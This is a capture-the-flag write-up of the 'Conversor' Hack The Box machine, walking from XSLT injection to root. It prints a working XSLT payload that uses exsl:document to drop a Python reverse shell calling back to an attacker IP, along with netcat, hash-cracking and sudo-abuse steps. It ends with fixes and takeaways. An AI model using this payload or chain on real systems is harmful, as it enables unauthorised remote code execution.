## Summary

Conversor is an Easy Linux machine hosting a web app that converts Nmap scans
using XML/XSLT. The `/about` endpoint leaks the source code, revealing an XSLT
processor and a cron job that runs any `.py` file in a scripts directory. An
**XSLT injection** with `exsl:document` writes a malicious script that the cron
job executes, granting a shell as `www-data`. A local SQLite database yields a
crackable MD5 hash for SSH access, and a sudo rule on **needrestart** is abused
to escalate to **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Conversor | Easy | Linux | Hack The Box |

## Attack Path

1. Service enumeration reveals HTTP and SSH.
2. Web enumeration discovers the `/about` endpoint.
3. The application source code is downloaded and analyzed.
4. An XSLT injection (`exsl:document`) writes a file to the server.
5. A cron job executes the written script.
6. A reverse shell is received as `www-data`.
7. Credentials are extracted from a SQLite database (MD5).
8. SSH access is obtained as the user.
9. A sudo rule on `needrestart` is abused to escalate to root.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.22.117
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.9p1 |
| 80 | HTTP | Conversor web application |

## Web Enumeration

The web application accepts XML and XSLT uploads to convert Nmap scans. Content
discovery was run with Gobuster:

```bash
gobuster dir -u http://conversor.htb/ -w /usr/share/wordlists/dirb/common.txt
```

Key findings:

- `/about` — page with a source code download option
- `/login`, `/register` — authentication system

The `/about` endpoint was essential, as it provided the application's source
code.

## Source Code Review

The source code revealed:

- `lxml` is used for XML/XSLT processing.
- File uploads are user-controlled.
- A scripts directory exists at `/var/www/conversor.htb/scripts/`.

`install.md` contained a cron job:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

In other words, any `.py` file placed in that directory is executed
automatically.

## Exploitation — XSLT Injection (exsl:document)

XSLT with the EXSLT `exsl:document` element can write files to disk during the
transformation. This was used to drop a reverse shell into the scripts
directory.

```xml
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exsl="http://exslt.org/common"
 extension-element-prefixes="exsl">

<xsl:template match="/">
  <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.X",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
  </exsl:document>
</xsl:template>

</xsl:stylesheet>
```

## Initial Access (User)

After uploading the payload, the file was written to `/scripts`, the cron job
executed it, and a reverse shell was received as `www-data`.

```bash
nc -lvnp 1234
```

A SQLite database was found containing user credentials:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db
SELECT * FROM users;
```

The MD5 hash was cracked and reused for SSH:

```bash
john --format=raw-md5 hash --wordlist=/usr/share/wordlists/rockyou.txt
ssh fismathack@10.129.22.117
```

The user flag lives at `/home/fismathack/user.txt`.

## Privilege Escalation

### Enumeration

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

### Abusing needrestart

The `needrestart` binary can be abused to execute code as root, which produced a
root shell. The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**XSLT injection → arbitrary file write → RCE** — insecure XSLT processing with
EXSLT support (`exsl:document`) allowed writing arbitrary files, which combined
with the writable-directory cron job produced automatic code execution as
`www-data`. Fix: disable EXSLT extensions, sandbox the XSLT processor, and never
execute files from attacker-writable directories.

**Misconfigured sudo (`needrestart`)** — the user could run `needrestart` as root
without a password, and the binary can be coerced into executing arbitrary code.
Fix: remove the NOPASSWD rule and avoid granting sudo on binaries that load
external code.

## Tools Used

- Nmap
- Gobuster
- John the Ripper
- Netcat
- SSH

## Key Takeaways

- XSLT processing can be extremely dangerous; EXSLT (`exsl:document`) enables file writes and RCE.
- Cron jobs that execute files from writable directories are a critical vector.
- Source code review is invaluable for finding the intended path.
- Interpreted binaries allowed via sudo make for trivial escalation.
